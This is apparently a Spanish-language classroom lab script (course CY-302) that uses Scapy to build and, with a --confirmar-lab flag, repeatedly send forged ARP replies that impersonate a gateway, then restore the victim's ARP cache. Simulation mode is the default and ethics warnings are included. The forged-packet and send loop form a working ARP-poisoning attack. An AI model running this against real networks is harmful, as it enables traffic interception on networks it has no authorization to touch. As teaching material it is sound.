"""
ARP spoofing con Scapy — laboratorio controlado (CY-302 Clase 11)

La diapositiva usa get_mac() y envía un ARP is-at falso. Ojo:
  - get_mac NO existe en Scapy; hay que implementarla (abajo).
  - Por defecto este script SOLO SIMULA (no envía paquetes).
  - El envío real exige --confirmar-lab en una VM/red de aula.

Ética: ARP spoofing sin autorización es ilegal.

Uso:
    python arp_spoofing.py
    python arp_spoofing.py --objetivo 192.168.56.10 --spoof 192.168.56.1
    python arp_spoofing.py --objetivo 192.168.56.10 --spoof 192.168.56.1 --confirmar-lab
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import Optional

try:
    from scapy.all import ARP, Ether, srp, send, conf
except ImportError:
    print("[ERROR] Scapy no está instalado. Ejecute: pip install scapy")
    sys.exit(1)

conf.verb = 0


def get_mac(ip: str, timeout: float = 2.0) -> Optional[str]:
    """
    Resuelve IP → MAC con ARP who-has.

    Esta función aparece en la diapositiva, pero NO viene incluida en Scapy.
    Por eso el import original `from scapy.all import get_mac` fallaba.
    """
    solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    try:
        respondidos, _ = srp(solicitud, timeout=timeout, verbose=0, retry=1)
    except PermissionError:
        print(
            "\n[ERROR] Se necesitan privilegios de administrador/root.\n"
            "En Windows: ejecute como Administrador e instale Npcap."
        )
        return None
    except OSError as error:
        print(f"\n[ERROR] ARP falló: {error}")
        return None

    if not respondidos:
        print(f"[AVISO] No hubo respuesta ARP para {ip}")
        return None

    return respondidos[0][1].hwsrc


def arp_spoof(target_ip: str, spoof_ip: str, enviar: bool = False) -> None:
    """
    Equivalente al ejemplo de la diapositiva:

        target_mac = get_mac(target_ip)
        packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
        srp(Ether(dst=target_mac)/packet, verbose=0)

    Mejoras:
      - valida que exista la MAC
      - por defecto solo muestra el paquete (simulación)
      - usa send() para respuestas ARP (no esperamos contestación)
    """
    print(f"\nObjetivo (víctima): {target_ip}")
    print(f"IP a suplantar   : {spoof_ip}")

    if enviar:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print("[ERROR] No se pudo obtener la MAC del objetivo. Abortando.")
            return
    else:
        # MAC ficticia solo para explicar el paquete en clase
        target_mac = "aa:bb:cc:dd:ee:ff"
        print("[SIMULACIÓN] No se consulta ni se envía nada a la red.")

    # op=2 → respuesta ARP (is-at), no pregunta (who-has)
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)

    print("\nPaquete ARP falso:")
    print(f"  summary : {packet.summary()}")
    print(f"  op      : {packet.op}  (2 = is-at)")
    print(f"  psrc    : {packet.psrc}  ← IP que se suplanta")
    print(f"  hwsrc   : {packet.hwsrc}  ← MAC del atacante (Scapy/local)")
    print(f"  pdst    : {packet.pdst}  ← IP de la víctima")
    print(f"  hwdst   : {packet.hwdst}  ← MAC de la víctima")

    if not enviar:
        print(
            "\nPara enviar de verdad en VM de laboratorio:\n"
            "  python arp_spoofing.py --objetivo <IP> --spoof <GATEWAY> --confirmar-lab"
        )
        return

    # En la PPT usan srp(...). Para spoofing basta send() (no hay respuesta útil).
    trama = Ether(dst=target_mac) / packet
    send(trama, verbose=0)
    print("\n→ Paquete ARP falso enviado una vez.")


def arp_spoof_laboratorio(
    target_ip: str,
    spoof_ip: str,
    segundos: int = 10,
    intervalo: float = 2.0,
) -> None:
    """Envío repetido + restauración de la caché ARP al terminar."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[ERROR] No se pudo obtener la MAC del objetivo.")
        return

    gateway_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)

    print(f"\nEnviando ARP falsos durante ~{segundos}s (Ctrl+C para parar)...")
    inicio = time.time()
    try:
        while time.time() - inicio < segundos:
            send(packet, verbose=0)
            print(f"  → {spoof_ip} is-at {packet.hwsrc}  →  {target_ip}")
            time.sleep(intervalo)
    except KeyboardInterrupt:
        print("\nInterrumpido.")
    finally:
        if gateway_mac:
            print("Restaurando caché ARP...")
            send(
                ARP(
                    op=2,
                    pdst=target_ip,
                    psrc=spoof_ip,
                    hwdst=target_mac,
                    hwsrc=gateway_mac,
                ),
                count=3,
                verbose=0,
            )
            print("Restauración enviada.")
        else:
            print("[AVISO] No se pudo restaurar (MAC del gateway desconocida).")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ARP spoofing didáctico con Scapy (modo simulación por defecto)"
    )
    parser.add_argument(
        "--objetivo",
        default="192.168.1.2",
        help="IP de la víctima de laboratorio (default diapositiva: 192.168.1.2)",
    )
    parser.add_argument(
        "--spoof",
        default="192.168.1.1",
        help="IP a suplantar, normalmente el gateway (default: 192.168.1.1)",
    )
    parser.add_argument(
        "--confirmar-lab",
        action="store_true",
        help="PERMITE envío real. Solo en VM/red aislada del aula.",
    )
    parser.add_argument(
        "--segundos",
        type=int,
        default=10,
        help="Duración del spoofing real (default: 10)",
    )
    args = parser.parse_args()

    print("=== ARP spoofing (Scapy) — laboratorio controlado ===")
    print("Sin --confirmar-lab solo se simula el paquete.\n")

    if not args.confirmar_lab:
        arp_spoof(args.objetivo, args.spoof, enviar=False)
        return

    print("⚠  MODO REAL: se enviarán paquetes ARP a la red local.")
    arp_spoof_laboratorio(args.objetivo, args.spoof, segundos=args.segundos)


if __name__ == "__main__":
    main()
